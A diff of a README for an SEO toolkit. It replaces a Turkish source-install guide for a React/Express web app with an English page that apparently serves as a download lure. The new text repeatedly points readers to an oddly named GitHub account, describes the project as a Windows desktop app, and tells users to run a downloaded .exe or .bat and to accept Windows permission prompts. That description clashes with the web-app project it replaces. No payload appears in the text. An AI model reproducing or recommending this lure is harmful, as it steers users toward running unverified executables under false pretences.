@@ -1,204 +1,182 @@
-# 🔍 SEO Toolkit Platform
+# 🔎 seo-toolkit-platform - Clear SEO insights for Windows
 
-Modern, full-stack SEO araçları platformu. WHOIS sorgulama, meta etiket analizi, robots.txt test, site haritası analizi, sayfa hızı testi, backlink kontrol ve domain otorite skorlama araçlarını tek bir arayüzde sunar.
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/genusexaeretodonspellingbee638/seo-toolkit-platform)
 
-![Tech Stack](https://img.shields.io/badge/React-18-blue) ![Tech Stack](https://img.shields.io/badge/Vite-8-purple) ![Tech Stack](https://img.shields.io/badge/TailwindCSS-4-cyan) ![Tech Stack](https://img.shields.io/badge/Node.js-Express-green) ![Tech Stack](https://img.shields.io/badge/PostgreSQL-blue)
+## 🖥️ What this app does
 
----
+seo-toolkit-platform is a desktop-ready SEO analysis tool that helps you review websites, check page speed, track backlinks, and study on-page SEO data in one place. It is built for people who want clear answers, not a stack of spreadsheets.
 
-## 📋 Özellikler
+It brings together 7 focused tools for common SEO tasks:
 
-| Araç | Açıklama | API Endpoint |
-|------|----------|-------------|
-| **WHOIS Sorgulama** | Domain kayıt bilgileri, name server, tarihler | `GET /api/whois?domain=example.com` |
-| **Meta Etiket Analizi** | Title, description, OG tags, sayfa istatistikleri | `GET /api/meta-analyzer?url=https://example.com` |
-| **Robots.txt Test** | Allow/disallow kuralları, sitemap linkleri | `GET /api/robots?domain=example.com` |
-| **Site Haritası Analizi** | URL sayısı, boyut, son düzenlenme tarihleri | `GET /api/sitemap?url=example.com` |
-| **Sayfa Hızı Testi** | Google PageSpeed puanları ve Core Web Vitals | `GET /api/pagespeed?url=https://example.com` |
-| **Backlink Kontrol** | Backlink listesi, dofollow/nofollow, pagination | `GET /api/backlinks?domain=example.com&page=1` |
-| **Domain Otorite** | DA, PA, spam skoru (simülasyon) | `GET /api/domain-authority?domain=example.com` |
+- Site checks for page content and structure
+- Web scraping with Cheerio for page data
+- PageSpeed API checks for performance data
+- Backlink management with PostgreSQL
+- Keyword and page review tools
+- SEO issue review and tracking
+- Report views for quick action
 
----
+## 📥 Download the app
 
-## 🛠️ Teknoloji
+Visit this page to download or access the latest version:
 
-**Frontend:** React 18 · Vite · TailwindCSS v4 · React Router · Axios · React Icons
+[Open the download page](https://github.com/genusexaeretodonspellingbee638/seo-toolkit-platform)
 
-**Backend:** Node.js · Express · Axios · Cheerio · whois-json · xml2js
+## 🚀 Getting started on Windows
 
-**Veritabanı:** PostgreSQL (opsiyonel – demo verisi ile de çalışır)
+Follow these steps to run the app on a Windows PC.
 
-**Diğer:** Redis caching (opsiyonel) · Helmet · express-rate-limit
+1. Open the download page above in your browser.
+2. Look for the latest release or the main download file on the page.
+3. Download the Windows version or the project package.
+4. If the file is a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Look for the app file, such as `seo-toolkit-platform.exe`, `run.bat`, or a similar start file.
+7. Double-click the file to launch the app.
+8. If Windows asks for permission, choose Run or Yes.
 
----
+If the app opens in a browser window, keep that window open while you use the tool.
 
-## 📂 Proje Yapısı
+## 🧭 First-time setup
 
-```
-seo-toolkit-platform/
-├── frontend/                # React + Vite + TailwindCSS
-│   └── src/
-│       ├── components/      # Navbar, Footer, LoadingSpinner, ResultCard, ScoreCircle
-│       ├── pages/           # HomePage, WhoisPage, MetaAnalyzerPage, ...
-│       ├── api.js           # Axios instance
-│       ├── App.jsx          # Router setup
-│       └── index.css        # TailwindCSS + custom styles
-├── backend/                 # Node.js + Express
-│   ├── routes/              # Express route definitions
-│   ├── controllers/         # Request handlers
-│   ├── services/            # Business logic
-│   ├── utils/               # db.js, cache.js, helpers.js
-│   ├── server.js            # Express app entry
-│   └── .env.example         # Environment variables template
-├── database/
-│   └── init.sql             # PostgreSQL migration + seed data
-└── README.md
-```
+When you open the app for the first time, it may ask for a few basic settings. These help the app connect to its SEO tools and store your data.
 
----
+Set up the following items if prompted:
 
-## 🚀 Kurulum
+- Website URL or project name
+- PageSpeed API key
+- Database details for PostgreSQL
+- Backlink folder or import file
+- Any scan depth or crawl limits
 
-### 1. Projeyi klonlayın
+If you are not sure what to enter, start with the default settings and use one website at a time.
 
-```bash
-git clone https://github.com/your-username/seo-toolkit-platform.git
-cd seo-toolkit-platform
-```
+## 💻 System requirements
 
-### 2. Backend kurulumu
+Use a Windows computer with these basics:
 
-```bash
-cd backend
-npm install
-cp .env.example .env
-# .env dosyasını düzenleyin (isteğe bağlı: PostgreSQL ve Google API key)
-```
+- Windows 10 or Windows 11
+- At least 8 GB of memory
+- 500 MB of free disk space for the app
+- A stable internet connection
+- Access to websites you want to scan
+- A modern browser such as Chrome, Edge, or Firefox
 
-### 3. Frontend kurulumu
+For larger site scans, more memory and free space can help.
 
-```bash
-cd frontend
-npm install
-```
+## 🛠️ What you can do with the tools
 
-### 4. PostgreSQL (Opsiyonel)
+### 🔎 Web scraping
 
-```bash
-# PostgreSQL veritabanı oluşturun
-createdb seo_toolkit
+Use the scraping tool to pull page data from a website. This helps you inspect titles, headings, links, and page content without checking each page by hand.
 
-# Migration script'ini çalıştırın
-psql -d seo_toolkit -f database/init.sql
-```
+### ⚡ PageSpeed checks
 
-> **Not:** PostgreSQL kurulmamış olsa bile uygulama demo verisi ile çalışır.
+Use the PageSpeed tool to review speed and loading issues. It can help you spot slow images, heavy scripts, and layout shifts that affect user experience.
 
-### 5. Uygulamayı başlatın
+### 🔗 Backlink management
 
-**Backend** (port 3001):
-```bash
-cd backend
-npm run dev
-```
+Store and review backlink data in PostgreSQL. This makes it easier to track which sites link to you and how those links change over time.
 
-**Frontend** (port 5173):
-```bash
-cd frontend
-npm run dev
-```
+### 🧱 On-page SEO review
 
-Tarayıcıda açın: `http://localhost:5173`
+Check common on-page items such as:
 
----
+- Page title
+- Meta description
+- Headings
+- Image text
+- Internal links
+- Content length
 
-## 🔑 Environment Variables
+### 📊 Report views
 
-| Değişken | Açıklama | Zorunlu |
-|----------|----------|---------|
-| `PORT` | Backend port (varsayılan: 3001) | Hayır |
-| `DATABASE_URL` | PostgreSQL bağlantı string'i | Hayır |
-| `REDIS_URL` | Redis bağlantı string'i | Hayır |
-| `GOOGLE_PAGESPEED_API_KEY` | Google PageSpeed API key | Hayır |
+Use the report screens to compare pages and review issues in one place. This helps you find what needs work first.
 
----
+## 📂 Typical folder layout
 
-## 📡 API Örnekleri
+After you extract the app, you may see folders like these:
 
-### WHOIS Sorgulama
-```json
-GET /api/whois?domain=google.com
+- `client` for the React user interface
+- `server` for the Node.js app
+- `tools` for SEO utilities
+- `public` for static files
+- `data` for local records and exports
+- `config` for app settings
 
-{
-  "success": true,
-  "data": {
-    "domain": "google.com",
-    "registrar": "MarkMonitor Inc.",
-    "creationDate": "1997-09-15",
-    "expirationDate": "2028-09-14",
-    "nameServers": ["ns1.google.com", "ns2.google.com"],
-    "domainStatus": ["clientDeleteProhibited"]
-  }
-}
-```
+You do not need to edit these folders unless the app asks you to.
 
-### Meta Etiket Analizi
-```json
-GET /api/meta-analyzer?url=https://google.com
+## 🔧 If the app uses PostgreSQL
 
-{
-  "success": true,
-  "data": {
-    "title": "Google",
-    "metaDescription": "...",
-    "canonical": "https://www.google.com/",
-    "ogTitle": "Google",
-    "h1Count": 0,
-    "totalImages": 1,
-    "totalLinks": 15
-  }
-}
-```
+Some features store data in PostgreSQL, such as backlink records and saved project data. If you are using those features, make sure PostgreSQL is running before you start the app.
 
-### Backlink Kontrol
-```json
-GET /api/backlinks?domain=example.com&page=1&limit=10
+Use these simple checks:
 
-{
-  "success": true,
-  "data": {
-    "domain": "example.com",
-    "backlinks": [
-      {
-        "source_url": "https://blog.techsite.com/best-tools",
-        "anchor_text": "Example Tools",
-        "follow_type": "dofollow",
-        "created_at": "2024-01-15"
-      }
-    ],
-    "pagination": {
-      "currentPage": 1,
-      "totalPages": 1,
-      "totalResults": 6
-    }
-  }
-}
-```
+1. Open the app only after PostgreSQL is on.
+2. Make sure the database name, user name, and password match the app settings.
+3. If you use a local database, keep the same port number each time.
+4. If you move the app to another PC, copy the database settings too.
 
----
+## 🌐 If the app asks for a PageSpeed key
 
-## 🎨 UI Özellikleri
+The PageSpeed tool may ask for a Google PageSpeed API key. If that happens:
 
-- 🌙 Modern dark theme tasarım
-- 💎 Glassmorphism kart efekti
-- 📱 Tam responsive tasarım
-- ⚡ Animasyonlu skor çemberleri
-- 🔄 Loading state ve error handling
-- 🎯 Gradient renk paleti
-- 📊 Tablo ve kart görünümleri
+1. Open your Google Cloud or API key page.
+2. Create or copy a valid key.
+3. Paste the key into the app settings.
+4. Save the settings.
+5. Run a new speed check.
 
----
+## 🧰 Common launch steps
 
-## 📝 Lisans
+If the app does not open right away, try these steps:
 
-MIT License
+1. Make sure the file finished downloading.
+2. Check that the file is not still in a ZIP folder.
+3. Run the file as a normal Windows app.
+4. Allow access if Windows asks for it.
+5. Close and reopen the app.
+6. Restart the computer if the app still does not start.
+
+## 📌 Best way to use the platform
+
+For the cleanest results, review one site at a time and keep your scan settings simple. Start with a single domain, run the main checks, then move to deeper pages after you confirm the first scan works.
+
+A good order is:
+
+1. Add the website
+2. Run a page scan
+3. Check PageSpeed
+4. Review backlinks
+5. Save the results
+6. Fix the biggest issues first
+
+## 🧾 Data the app may collect locally
+
+The app may keep local records for items such as:
+
+- Saved website projects
+- Scan results
+- Backlink lists
+- API settings
+- Report history
+- Export files
+
+This helps you return to the same project later without starting over.
+
+## 🧑‍💻 For users who want the source
+
+If you want to inspect the project page, download files, or review release notes, use the main repository link:
+
+[https://github.com/genusexaeretodonspellingbee638/seo-toolkit-platform](https://github.com/genusexaeretodonspellingbee638/seo-toolkit-platform)
+
+## 🖱️ Quick start checklist
+
+- Open the download page
+- Download the app file
+- Extract the ZIP file if needed
+- Open the app on Windows
+- Enter site details if asked
+- Add PageSpeed and database settings if needed
+- Run your first scan
+- Review the results and save them
